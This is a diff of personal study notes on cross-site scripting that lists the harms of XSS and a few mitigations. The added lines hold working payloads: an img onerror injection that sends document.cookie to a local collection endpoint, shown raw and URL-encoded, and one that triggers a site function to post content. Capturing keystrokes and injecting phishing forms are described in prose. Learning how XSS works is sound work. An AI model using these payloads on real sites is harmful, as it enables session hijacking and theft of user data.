@@ -7,7 +7,7 @@ XSS(CRoss Side Scripting) - Someone is able to inject javascript into your websi
 
 
 
-    Vulnerability because of XSS                                              Mitigations
+    Vulnerability because of XSS                                              
 
         a)User Session Hijacking
         b)Unauthorization Activities(sending message)
@@ -16,12 +16,52 @@ XSS(CRoss Side Scripting) - Someone is able to inject javascript into your websi
         e)Phishing Attack - Using injection I injected a form
             and that form does something the hood for you.
 
+    a)User session hijacking -
+        see example2 in Vulnerability.here hacker was able to get access to cookie in browser.
 
-    now a days you cannot pass a script tag or write js that will get attached or script
-    will be xecuted directly. In past this used to happen. but this a hack, here we are 
-    passing a image tag- 
+        lets pass this string as query parameter -
 
-    ?name=<img src=\"does-not-exist\" onerror=\"var img = document.createElement('\img\');img.src="\http://127.0.0.1:5501/cookie?data=${document.cookie}`;document.querySelector(\'body\').appendChild(img);\">
+
+
+        encodeURIComponent("<img src=\"does-not-exist\" onerror=\"var img = document.createElement('\img\'); img.src=`\http://127.0.0.1:5501/cookie?data=${document.cookie}`; document.querySelector(\'body\').appendChild(img);\">")
+
+
+        "%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement('img')%3Bimg.src%3D%60http%3A%2F%2F127.0.0.1%3A5501%2Fcookie%3Fdata%3D%24%7Bdocument.cookie%7D%60%3Bdocument.querySelector('body').appendChild(img)%3B%22%3E"
+
+        here we are image tag in query parameter, there was a time where you can pass a script tag or write
+        the js code ,now a days browsers are very smart and you cannot inject script tag.        
+        but this a hack, here we are passing a image tag.
+
+        we need to use the encodeURIComponent and escape the ' and ".enc.
+
+        see netwrok request, there were 2 error request second one passed the user cookie.
+
+    b)unauthorized activities -
+        here hacker trigger the function defined in script.
+
+        pass this as query param -
+
+        ?name=<img src="error.gif" onerror="createPost('HACK_TITLE','HACK_DESCRIPTION');"/>
+
+    c)capturing keystrokes
+
+        same as above , but here we wrote a script that captires user keystrokes and sends a  api request.
+        see screenshot1 for request
+
+    d)stealing information
+        here user sent a request and as query param passsed entire dom data. see figure 2,3.
+
+    e)phishing attack -
+        here we just passed  html. html dispalyed a form.to user(may be replace a existing form and
+        steal user information).
+        user filled that form and onSubmit that form was submitted to users url with data filled by
+        user as query param
+
+
+Mitigations -
+    -List all possible ways to take user Input (as query param, as form)
+    -instead of using innerHTML, use innerText| textContent
+    -escaping mechanism(34:00)
 
 
 
